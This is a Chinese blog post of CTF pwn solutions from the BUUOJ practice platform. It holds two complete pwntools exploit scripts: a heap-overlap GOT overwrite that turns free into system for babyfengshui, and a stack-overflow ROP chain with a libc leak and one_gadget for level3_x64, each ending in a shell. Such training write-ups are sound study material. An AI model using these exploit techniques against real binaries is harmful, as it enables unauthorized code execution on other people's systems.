---
toc: true
classes: wide
layout: single
title:  "Buuoj PWN 题目冲分过程2（指俯冲）"
date:   2021-01-03 00:10:38 +0800
categories: 
  - pwn
---

# Buuoj PWN 题目冲分过程2（指俯冲）


## Problems

### babyfengshui_33c3_2016

```python

#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './babyfengshui_33c3_2016'
e = ELF(filename)
p = process(filename)
# p = remote("node3.buuoj.cn", 29672)

def Add(name, text, text_buf_len=None, text_len=None):
    """
    struct st { char* desc; char name[0x7c]; };
    输入 description 长度，malloc指定长度得ptr_desc，然后memset置零
    再malloc(0x80),同样置零得ptr_st，这个应该是一个结构体，ptr_st.ptr_desc = ptr_desc
    结构体指针数组 arr_st[index] = ptr_st
    然后f1 get_name(arr_st[index].name, 0x7c) -> fgets(v0, v1, STDIN), strchr(v0, 0x0a)[0]=0
    index+=1
    f2 get_text(index-1) -> if check arr_st[a0].desc+len < (arr_st[a0] - 4) <---- &(chunk.size), then get_name(arr_st[a0].desc, len+1) 
    """
    p.sendlineafter(b'Action: ', b'0')
    p.sendlineafter(b'size of description: ', bytes(f'{text_buf_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'name: ', name)
    p.sendlineafter(b'text length: ', bytes(f'{text_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'text: ', text)


def Delete(index):
    """
    free(arr_st[a0].desc)
    free(arr_st[a0])
    arr_st[0] = NULL
    """
    p.sendlineafter(b'Action: ', b'1')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))


def Display(index):
    """
    printf("%s", arr_st[a0].name)
    printf("%s", arr_st[a0].desc)
    """
    p.sendlineafter(b'Action: ', b'2')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))


def Update(index, text, text_len=None):
    """"""
    p.sendlineafter(b'Action: ', b'3')
    p.sendlineafter(b'index: ', bytes(f'{index}', encoding='utf8'))
    p.sendlineafter(b'text length: ', bytes(f'{text_len or len(text)}', encoding='utf8'))
    p.sendlineafter(b'text: ', text)


def Exit():
    p.sendlineafter(b'Action: ', b'4')


Add(b'name0', b'desc0', text_buf_len=0x10-8)  # index=0, 0x10 0x88, x
Add(b'name1', b'desc1', text_buf_len=0x10-8)  # index=1, 0x10 0x88
Add(b'name2', b'desc2', text_buf_len=0x10-8)  # index=2, 0x10 0x88, x
Add(b'/bin/sh', b'/bin/sh')  # index=3, 0x10 0x88, 

c_func_name = 'free'
c_func_got = e.got[c_func_name]

Delete(0)
Delete(2)
payload_leak_got = b'x' * (0x88 - 8) + \
    b'xxxx' + p32(0x10|0x1) + b'x'*8 + \
    b'yyyy' + p32(0x88|0x1) + p32(c_func_got) + b'\x00'

Add(b'name4', payload_leak_got, text_buf_len=0x80-0x8)  # index=4
Display(1)
p.recvuntil(b'description: ')
c_func_addr = u32(p.recv(4))
log.success(f'c: {c_func_name}() address={hex(c_func_addr)}')

searcher = LibcSearcher(func=c_func_name, address=c_func_addr)
c_base_addr = c_func_addr - searcher.dump(c_func_name)
system_addr = c_base_addr + searcher.dump('system')

log.success(f'c base address={hex(c_base_addr)}; system()={hex(system_addr)}')

Update(1, p32(system_addr) + b'zzzz')

Delete(3)
p.interactive()
```

### jarvisOJ_level3_x64

```python
#!/usr/bin/python3.6
from pwn import *
from LibcSearcher import LibcSearcher

filename = './level3_x64'
# p = process(filename)
p = remote('node3.buuoj.cn', 28216)
elf = ELF(filename)
# libc = ELF('/home/ubuntu/glibc-2.23/lib/libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc/jarvisOJ_level3_x64-libc-2.19.so')
libc = ELF('./libc/ubuntu_16_x86_64_libc-2.23.so')

pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1

log.info(f'write@plt={hex(elf.plt["write"])}, write in symbols: {hex(libc.sym["write"])}')

payload = b'a'*(0x80+8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(elf.got["write"]) + p64(0) + p64(elf.plt["write"]) + p64(elf.sym["main"])
p.sendlineafter(b'Input:\n', payload)

write_address = u64(p.recv(8))

searcher = LibcSearcher()
searcher.add_condition('write', write_address)


base_address = write_address - libc.sym['write']
# base_address = write_address - searcher.dump('write')

# gadgets = [0x4527a, 0xf0364, 0xf1207, 0x45226]
# gadgets = [0x4647c, 0xe5765, 0xe66bd, 0x46428]
gadgets = [0x4526a, 0xf02a4, 0xf1147, 0x45216]

one_gadget = gadgets[1] + base_address
log.info(f'write={hex(write_address)}, libc={hex(base_address)}, gadget={hex(one_gadget)}')

payload = b'a'*(0x80+8) + p64(one_gadget)
p.sendlineafter(b'Input:\n', payload)
p.interactive()
```